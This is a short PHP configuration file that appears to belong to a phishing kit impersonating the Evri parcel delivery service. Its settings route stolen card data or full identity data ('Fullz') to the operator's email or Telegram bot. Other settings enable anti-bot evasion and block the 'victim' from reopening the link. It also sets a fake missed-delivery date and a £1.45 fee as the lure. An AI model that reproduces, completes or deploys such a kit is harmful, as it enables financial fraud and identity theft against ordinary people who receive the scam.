<?php

$send = ""; // YOUR EMAIL GOES HERE
$antitype=1; // 1 SIMPLE ANTIBOTS, 2 EXTENSIVE ANTIBOTS

$Send_Log=1;  // SEND RESULTS TO EMAIL
$Save_Log=0;  // SAVE RESULTS TO CPANEL
$Get_Fullz = 0; // Set to 1 to Capture Fullz and 0 to Capture CC 
$One_Time_Access=1; // ONE TIME ACCESS, THIS PREVENTS THE VICTIM FROM LOADING THE LINK AGAIN AFTER SUBMIT

$Send_Telegram=0; 
$api = "";
$chatid = "";

$exitLink = "https://www.evri.com/coronavirus-response";

$attemptedDeliveryDate = "Wed 6th Apr";
$deliveredAt = "16:25";
$deliveryPrice = 1.45; // Set to 1 If you want login to be sent to email

// You can change the alert message to anything you suit so when the victim logins, they see the message.

?>